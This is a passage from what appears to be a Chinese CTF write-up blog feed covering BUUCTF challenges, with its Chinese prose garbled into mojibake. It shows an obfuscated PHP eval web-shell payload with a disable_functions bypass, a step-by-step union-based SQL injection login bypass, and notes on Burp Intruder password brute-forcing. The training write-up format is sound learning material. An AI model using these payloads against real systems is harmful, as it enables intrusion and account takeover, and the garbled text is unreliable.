<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨æ„åé¢è¦æœ‰ï¼›ï¼Œä»£è¡¨phpä»£ç ç»“æŸ</span></span><br><span class="line"><span class="comment">//è¿™é‡Œ~æ˜¯å–åï¼Œä¹‹å‰urlencodeé‡Œå–åäº†ä¸€æ¬¡ï¼Œèµ‹å€¼æ—¶å†å–åä¸€æ¬¡ï¼Œç›¸å½“äºæ²¡æœ‰å–å</span></span><br><span class="line"></span><br><span class="line">ç­‰åŒäº</span><br><span class="line"></span><br><span class="line">?code=(assert)(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]));</span><br><span class="line"></span><br><span class="line">(assert)å› ä¸ºæ˜¯assertæ˜¯å‡½æ•°ï¼Œè¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œäºæ˜¯å› ä¸ºæ–­è¨€(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]))ï¼Œæ‰€ä»¥æŠŠ<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>])å½“ä½œphpæ‰§è¡Œï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿åˆ°shelläº†</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">èšå‰‘è¿æ¥</span><br><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯å‘ç°flagæ˜¯ç©ºçš„</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181221552.png" alt="image-20220903181221552"></p>
<p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpæ‰çŸ¥é“ï¼Œéœ€è¦èšå‰‘æ’ä»¶<code>disable_functions</code>ï¼Œç¦æ­¢ç½‘ç«™çš„å‡½æ•°ï¼Œé˜²æ­¢å…¶é˜»æ­¢è¯»å–flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181348649.png" alt="image-20220903181348649"></p>
<p>å†åœ¨ä¸»é¡µå³é”®</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181431745.png" alt="image-20220903181431745"></p>
<p>æ¨¡å¼é€‰æ‹©</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181451266.png" alt="image-20220903181451266"></p>
<p>ç„¶åç‚¹å‡»å¼€å§‹</p>
<p>ç»ˆç«¯è¾“å…¥</p>
<p><code>/readflag</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181528195.png" alt="image-20220903181528195"></p>
<p>å¾—åˆ°flag</p>
<h2 id="12-GXYCTF2019-BabySQli"><a href="#12-GXYCTF2019-BabySQli" class="headerlink" title="12.[GXYCTF2019]BabySQli"></a>12.[GXYCTF2019]BabySQli</h2><h3 id="1-é¢˜ç›®æè¿°-9"><a href="#1-é¢˜ç›®æè¿°-9" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹æ˜¯ä¸€ä¸ªç™»å½•æ¡†</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909203922998.png" alt="image-20220909203922998"></p>
<p>æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line">è´¦å·ï¼š<span class="literal">admin</span></span><br><span class="line">å¯†ç ï¼š<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909204018695.png" alt="image-20220909204018695"></p>
<p>æŠ¥é”™ï¼Œçœ‹æ¥ç”¨æˆ·åæ²¡é”™ï¼Œå¯†ç é”™è¯¯</p>
<p>æŸ¥çœ‹æºç çœ‹çœ‹</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204046072.png" alt="image-20220909204046072"></p>
<p>å‘ç°æœ‰ä¸€ä¸²åŠ å¯†å­—ç¬¦ï¼Œçœ‹èµ·æ¥åƒbase</p>
<p>å…ˆç”¨<code>base32</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204202994.png" alt="image-20220909204202994"></p>
<p>çœ‹èµ·æ¥å°±æ˜¯<code>base32+base64</code>æ··åˆç¼–ç ï¼Œå†ç”¨<code>base64</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204325138.png" alt="image-20220909204325138"></p>
<hr>
<p>å½“ç„¶çœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥æ— è„‘<code>ciphey</code>ï¼Œä¹Ÿå¯ä»¥ï¼Œå½“ç„¶è¿˜æ˜¯éœ€è¦äº†è§£ä¸åŒç¼–ç å’ŒåŠ å¯†å­—ç¬¦çš„ç‰¹ç‚¹</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204746167.png" alt="image-20220909204746167"></p>
<p>ä¹Ÿå¯ä»¥å¾—åˆ°è§£ç ç»“æœ</p>
<hr>
<p>ç”±</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å¯çŸ¥ï¼Œsqlæ³¨å…¥ç‚¹åœ¨Usernameå¤„ï¼Œä¸”ä¸ºå•å¼•å·é—­åˆ</p>
<p>äºæ˜¯æˆ‘ä»¬å°æ„é€ æ³¨å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>and%<span class="number">201</span>=<span class="number">1</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909205630033.png" alt="image-20220909205630033"></p>
<p>å‘ç°æœ‰çš„å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fuzzçˆ†ç ´æµ‹è¯•çœ‹çœ‹ï¼Œä¹Ÿå¯ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•</p>
<p>æˆ‘è¿™é‡Œå…ˆçˆ†ç ´è¯•è¯•ï¼ˆå»ºè®®çˆ†ç ´è¿˜æ˜¯æ…¢ä¸€äº›ï¼Œåé¢ç›´æ¥å¤ªå¤šè¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸å‘è¿”å›åŒ…äº†ï¼‰</p>
<p>å¤§æ¦‚ç»Ÿè®¡ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">or</span><br><span class="line">()</span><br><span class="line"><span class="operator">=</span></span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰å…ˆè¯•è¯•è”åˆæ³¨å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">ç”±äºè¿‡æ»¤äº†or</span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨<span class="keyword">order</span> <span class="keyword">by</span>æ¥åˆ¤æ–­åˆ—æ•°ï¼Œå¯ä»¥ç”¨è”åˆæ³¨å…¥ï¼Œåˆ©ç”¨<span class="keyword">select</span>çš„ç»“æœæ¥åˆ¤æ–­</span><br></pre></td></tr></table></figure></div>

<p>å…ˆè¯•è¯•<code>select 1,2</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909214254664.png" alt="image-20220909214254664"></p>
<p>å‘ç°æŠ¥é”™ï¼Œåˆ—æ•°æœ‰é—®é¢˜</p>
<p>å†è¯•è¯•<code>select 1,2,3</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909214345515.png" alt="image-20220909214345515"></p>
<p>å‘ç°è™½ç„¶æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰ç›´æ¥å›æ˜¾</p>
<p>å†è¯•è¯•<code>select 1,2,3,4</code></p>
<p>åˆæŠ¥é”™</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909214506605.png" alt="image-20220909214506605"></p>
<p><strong>æ‰€ä»¥å¾—å‡º<code>åˆ—æ•°ä¸€å…±æœ‰3åˆ—</code></strong></p>
<p><strong>æ ¹æ®ç»éªŒè¿™ä¸‰åˆ—ï¼Œåˆ†åˆ«æ˜¯</strong><u><strong>id,username,password</strong></u></p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥è¿›è¡Œç¡®è®¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="built_in">select</span>%<span class="number">20</span>â€adminâ€œ,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;pw=123456   </span></span><br><span class="line"><span class="comment">//æŠŠç¬¬ä¸€ä½ï¼Œå³1çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220910085003536.png" alt="image-20220910085003536"></p>
<p>æç¤ºç”¨æˆ·åé”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åä¸åœ¨ç¬¬ä¸€ä½</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="number">-1</span>&#x27;<span class="variable">%20</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="number">3</span>#&amp;pw<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">//æŠŠç¬¬äºŒä½ï¼Œå³<span class="number">2</span>çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220910085115686.png" alt="image-20220910085115686"></p>
<p>æç¤ºå¯†ç é”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åå›æ˜¾å°±åœ¨ç¬¬äºŒä½</p>
<p><strong>ä½†æ˜¯æ²¡æœ‰å›æ˜¾æˆ‘ä»¬selectçš„æ•°æ®ï¼Œå¯æ˜¯å¦‚æœç”¨æŠ¥é”™æ³¨å…¥å’Œç›²æ³¨çš„è¯ï¼Œ()è¢«è¿‡æ»¤äº†ï¼Œä¹Ÿä¸èƒ½ç”¨</strong></p>
<p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰è€ƒè™‘ï¼Œæ€ä¹ˆæ‰å¯ä»¥ç™»å½•ä¸Šå»</p>
<p>é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªsqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå¯†ç ä¸å¯èƒ½ç®€å•çš„çˆ†ç ´å°±å¯ä»¥è§£å†³</p>
<p><strong>å¯†ç è‚¯å®šæ˜¯è¿›è¡ŒåŠ å¯†ï¼Œæœ€å¸¸è§çš„å¯†ç åŠ å¯†å°±æ˜¯md5</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨<code>md()</code>å‡½æ•°æŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œå†åŠ ä¸Šæˆ‘ä»¬çš„ç”¨æˆ·åä¸€èµ·å¯¼å…¥åˆ°é¢˜ç›®çš„æ•°æ®åº“é‡Œï¼Œå³å¯å®Œæˆç™»å½•</p>
<p>æ³¨æ„å› ä¸º<code>()</code>è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥åªèƒ½å…ˆæŠŠå¯†ç è¿›è¡Œmd5åŠ å¯†ï¼Œåœ¨å¯¼å…¥ï¼Œè€Œä¸èƒ½ç›´æ¥ç”¨å‡½æ•°</p>
<hr>
<p>è¿™é‡Œåˆæœ‰ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹</p>
<p><strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚ã€union selectã€‘</strong></p>
<p>åœ¨<code>Web-study</code>é‡Œå†™çš„è¯¦ç»†</p>
<p>ä¸‹é¢ç®€å•è¯´ä¸€ä¸‹æµç¨‹</p>
<p>å…ˆæŠŠæˆ‘ä»¬çš„å¯†ç 123456åˆ©ç”¨md5åŠ å¯†</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220910090640990.png" alt="image-20220910090640990"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ„é€ payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="Q"><figure class="iseeu highlight /q"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">201</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class="number">123456</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">è”åˆæ³¨å…¥çš„æŠ€å·§ï¼Œå°±æ˜¯åœ¨ä½¿ç”¨<span class="built_in">union</span> <span class="keyword">select</span>æ—¶å€™ï¼Œåé¢çš„æ•°æ®å¦‚æœä¸å­˜åœ¨ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</span><br><span class="line">å¦‚ä¸Šé¢çš„</span><br><span class="line"></span><br><span class="line">æ ¹æ®ä¸Šé¢baseç¼–ç ç»“æœï¼Œ<span class="keyword">select</span> * <span class="keyword">from</span> user <span class="built_in">where</span> username = &#x27;$name&#x27;</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬åˆ©ç”¨<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span></span><br><span class="line"></span><br><span class="line">å› ä¸ºuserè¡¨é‡Œä¸å­˜åœ¨id=<span class="number">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¼šç”Ÿæˆä¸€ä¸ªä¸€ä¸ªæ•°æ®æ’å…¥è¡¨ä¸­</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">å½“nameå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼ŒæŠŠæ•°æ®æ’å…¥userè¡¨ä¸­æ—¶</span><br><span class="line">åé¢passwordåªè¦å’Œæ˜æ–‡ä¸€æ ·ï¼Œå³å¯ç™»å½•æˆåŠŸ</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220910091405613.png" alt="image-20220910091405613"></p>
<p>å¾—åˆ°flag</p>
<h2 id="13-æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#13-æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="13.[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>13.[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><h3 id="1-é¢˜ç›®æè¿°-10"><a href="#1-é¢˜ç›®æè¿°-10" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>ä¸ªäººç”Ÿæ´»çäº‹</title>
    <url>/2022/09/24/life/</url>
    <content><![CDATA[<p><code>éšä¾¿å†™å†™</code></p>
<span id="more"></span>]]></content>
      <categories>
        <category>ç”Ÿæ´»</category>
      </categories>
  </entry>
  <entry>
    <title>WEBå­¦ä¹ ç¬”è®°</title>
    <url>/2022/05/31/daily/</url>
    <content><![CDATA[<p><u><code>éšä¾¿è®°ä¸€ä¸‹ï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹ä¸­çš„å­¦ä¹ ç»éªŒï¼Œæ¬¢è¿æŒ‡æ­£å’Œè¡¥å……</code></u></p>
<span id="more"></span>

<h1 id="å­¦ä¹ éšè®°"><a href="#å­¦ä¹ éšè®°" class="headerlink" title="å­¦ä¹ éšè®°"></a>å­¦ä¹ éšè®°</h1><h2 id="1-ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³ï¼š"><a href="#1-ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³ï¼š" class="headerlink" title="1.ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³ï¼š"></a>1.ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’Œ<u><strong>Cookie</strong></u>è§£å†³ï¼š</h2><p>ä»Šå¤©åœ¨æ‰“buuctfé¶åœºçš„æ—¶å€™é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“é¡µé¢è·³è½¬æ—¶ï¼Œä¼šæ˜¾ç¤ºè¿æ¥é‡ç½®ï¼Œå¯¼è‡´æˆ‘çš„sqlæ³¨å…¥ç»“æœä¸èƒ½æ˜¾ç¤ºï¼Œç„¶åç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°å¯èƒ½æ˜¯æµè§ˆå™¨ç¼“å­˜å¤ªå¤šå¯¼è‡´çš„ï¼Œäºæ˜¯æˆ‘æŠŠæµè§ˆå™¨çš„ç¼“å­˜å’Œcookieä¸€åŒå…¨éƒ¨æ¸…ç©ºï¼Œç„¶åæˆ‘å†åˆ·æ–°sql æ³¨å…¥é‚£é“é¢˜çš„ç•Œé¢ï¼Œè§£å†³äº†ï¼Œæ²¡æœ‰å†æ˜¾ç¤ºè¿æ¥é‡ç½®ï¼Œä¹Ÿæ˜¾ç¤ºäº†æˆ‘çš„æ³¨å…¥ç»“æœï¼Œæˆ‘æ­£è¦äº¤flagçš„æ—¶å€™ï¼Œç„¶åï¼Œæˆ‘å‘ç°â€¦..ï¼Œæˆ‘çš„buuctfè´¦å·ä¸‹çº¿ï¼Œæˆ‘çš„csdnè´¦å·ä¹Ÿä¸‹çº¿äº†</p>
<p>cookieçš„ä½œç”¨å’Œé‡è¦æ€§å°±å‡ºæ¥äº†ï¼Œä»è¿™ä¸ªäº‹æƒ…çœ‹å‡ºï¼Œcookieæ˜¯å½“æˆ‘ä»¬ç™»å½•ç½‘ç«™çš„ä¸»è¦èº«ä»½å‡­è¯ï¼Œå½“æˆ‘åˆ é™¤cookieåï¼Œæˆ‘æ— æ³•è¯æ˜è‡ªå·±èº«ä»½æ—¶ï¼Œå³ç½‘ç«™å½“å‰æµè§ˆå™¨æ— è¯¥è´¦å·å½“å‰åœ¨è¯¥ç½‘ç«™çš„cookieæ—¶ï¼Œç½‘ç«™å°±ä¼šå¼ºåˆ¶ä¸‹çº¿æˆ‘çš„è´¦å·</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ç™»å½•ç½‘ç«™æ—¶ï¼ˆæ²¡æœ‰é€€å‡ºï¼‰ï¼Œç‚¹å‡»äº†å…¶ä»–é“¾æ¥å¯¼è‡´è‡ªå·±åœ¨è¯¥æµè§ˆå™¨çš„è¯¥ç½‘ç«™çš„cookieå¤–æ³„ï¼Œè¢«æœ‰å¿ƒäººè·å–ï¼Œé‚£ä¹ˆæ‹¥æœ‰ä½ çš„cookieçš„äººï¼Œå°±å¯ä»¥ç™»å½•ä½ çš„è´¦å·ï¼Œåœ¨ä½ ç™»å½•çš„ç½‘ç«™ä¸Šè¿›è¡Œä¿®æ”¹å¯†ç ï¼Œåˆ é™¤æ–‡ç« ï¼Œç”šè‡³å¯ä»¥è½¬è´¦ç­‰ç­‰</p>
<p>æ‰€ä»¥ä»¥åç™»å½•äº†ä¸€äº›é‡è¦ç½‘ç«™æ—¶ï¼Œæ¯”å¦‚æ”¯ä»˜å®ï¼Œæ·˜å®ï¼Œåšå®¢ç½‘ç«™æ—¶ï¼Œåˆ«éšä¾¿ç‚¹å‡»é“¾æ¥ï¼Œä¿è¯è‡ªå·±çš„ä¿¡æ¯å®‰å…¨ï¼Œä¸è¦é»‘å®¢è¢«é»‘å®¢é»‘äº†ï¼Œé‚£ç¡®å®æœ‰ç‚¹éš¾ä¸ºæƒ…äº†</p>
<p><code>Cookieå®é™…ä¸Šæ˜¯ä¸€å°æ®µçš„æ–‡æœ¬ä¿¡æ¯ã€‚å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨éœ€è¦è®°å½•è¯¥ç”¨æˆ·çŠ¶æ€ï¼Œå°±ä½¿ç”¨responseå‘å®¢æˆ·ç«¯æµè§ˆå™¨é¢å‘ä¸€ä¸ªCookieã€‚å®¢æˆ·ç«¯æµè§ˆå™¨ä¼šæŠŠCookieä¿å­˜èµ·æ¥ã€‚å½“æµè§ˆå™¨å†è¯·æ±‚è¯¥ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨æŠŠè¯·æ±‚çš„ç½‘å€è¿åŒè¯¥Cookieä¸€åŒæäº¤ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ£€æŸ¥è¯¥Cookieï¼Œä»¥æ­¤æ¥è¾¨è®¤ç”¨æˆ·çŠ¶æ€ã€‚æœåŠ¡å™¨è¿˜å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹Cookieçš„å†…å®¹</code></p>
<h2 id="2-Burpsuiteå¯†ç çˆ†ç ´åˆæ¬¡ä½¿ç”¨"><a href="#2-Burpsuiteå¯†ç çˆ†ç ´åˆæ¬¡ä½¿ç”¨" class="headerlink" title="2.Burpsuiteå¯†ç çˆ†ç ´åˆæ¬¡ä½¿ç”¨"></a>2.Burpsuiteå¯†ç çˆ†ç ´åˆæ¬¡ä½¿ç”¨</h2><p>è™½ç„¶ä¸çŸ¥é“è¿™ä¸ªç½‘ç«™æ˜¯é‚£ä½å¤§ä½¬æ€»ç»“å»ºç«‹çš„ï¼Œä½†è¿˜æ˜¯å¾ˆæ„Ÿè°¢ï¼ŒèŠ‚çœå¾ˆå¤šæ—¶é—´</p>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
<p>ä¹‹å‰åœ¨å­¦ä¹ burpsuiteçš„æ—¶å€™ï¼Œå¤§éƒ¨åˆ†æ—¶é—´åœ¨ç”¨proxyå’Œrequestï¼Œä¸€ç›´æƒ³ç”¨intruderï¼Œåœ¨åšåŠŸé˜²ä¸–ç•Œweak_authè¿™é“é¢˜æ—¶ï¼Œéœ€è¦ç”¨å­—å…¸çˆ†ç ´</p>
<p>äºæ˜¯æˆ‘ä¾¿äº†è§£äº†ä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½</p>
<p>åœ¨intruderä¸‹ï¼Œä¸»è¦çœ‹payload</p>
<p>payload Setsä¸»è¦ç”¨Simple listå’ŒBrute forcer</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="1-Simple-list"><a href="#1-Simple-list" class="headerlink" title="1.Simple list"></a>1.Simple list</h4><p>ä¸»è¦å°±æ˜¯è®²å†™å¥½çš„å¯†ç åˆ—è¡¨æŒ¨ä¸ªè¿›è¡Œæµ‹è¯•ï¼Œè¯•å‡ºå¯ä»¥æ­£ç¡®ç™»å½•çš„å¯†ç </p>
<p><img src="/2022/05/31/daily/image-20220624165348786.png" alt="image-20220624165348786"></p>
<h4 id="2-Brute-forcer"><a href="#2-Brute-forcer" class="headerlink" title="2.Brute forcer"></a>2.Brute forcer</h4><p>å°±æ¯”è¾ƒæš´åŠ›ï¼Œå¯ä»¥ä»ä¸‹å›¾çœ‹åˆ°Requset countæœ‰8,398,080æ¬¡ï¼Œå› ä¸ºä»–æ˜¯æŠŠä¸‹é¢Character seté‡Œçš„æ‰€ä»¥å­—ç¬¦çš„æ’åˆ—ç»„åˆéƒ½è¯•äº†ï¼Œç®€å•ç²—æš´ï¼Œä¹Ÿéå¸¸è€—æ—¶é—´</p>
<p><img src="/2022/05/31/daily/image-20220624165405777.png" alt="image-20220624165405777"></p>
<p>è¿™é‡Œä»¥ä¸€æ¬¡çˆ†ç ´ä¸ºä¾‹ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹æ–¹æœ‰ä¸¤ä¸ª<code>Â§ Â§</code>ï¼Œè¿™ä¸¤å¤„å°±æ˜¯payloadè¾“å…¥ç‚¹ï¼Œæˆ‘ä»¬è¾“å…¥çˆ†ç ´æ•°æ®å°±ä¸æ–­åœ¨è¿™ä¸¤å¤„ä¸Šä¼ æµ‹è¯•</p>
<p><img src="/2022/05/31/daily/image-20220624170325792.png" alt="image-20220624170325792"></p>
<p>å¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸€å¤„çš„æ•°æ®ï¼Œæ¯”å¦‚ä¸‹æ–¹çš„usernameä¸ºadminï¼Œå°±ä¸ç”¨ç”¨æµ‹è¯•æ•°æ®çˆ†ç ´ï¼Œåªç”¨åœ¨passwordå¤„çˆ†ç ´</p>
<p><img src="/2022/05/31/daily/image-20220624170753675.png" alt="image-20220624170753675"></p>
<p>é‚£ä¹ˆçˆ†ç ´å®Œåï¼Œå¦‚ä½•åˆ†è¾¨å“ªä¸ªæ‰æ˜¯æ­£ç¡®å¯†ç å‘¢</p>
<p>ä¸»è¦åˆ†ælengthï¼Œå¦‚æœå‡ºç°ä¸å¤§éƒ¨åˆ†lengthä¸åŒçš„å¯†ç ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å°±æ˜¯æ­£ç¡®å¯†ç ï¼Œæ¯”å¦‚æ­¤å¤„ï¼Œ 123456å°±æ˜¯æ­£ç¡®å¯†ç </p>
<p><img src="/2022/05/31/daily/image-20220624170455916.png" alt="image-20220624170455916"></p>
<h4 id="3-Numbers"><a href="#3-Numbers" class="headerlink" title="3.Numbers"></a>3.Numbers</h4><p><img src="/2022/05/31/daily/image-20220626083426611.png" alt="image-20220626083426611"></p>
<p>çº¯æ•°å­—å‹çˆ†ç ´ï¼ŒFromæ˜¯å¼€å§‹æ•°å­—ï¼ŒToæ˜¯ç»“æŸæ•°å­—ï¼ŒStepæ˜¯é—´éš”å¤šå°‘æ•°å­—çˆ†ç ´ä¸€æ¬¡</p>
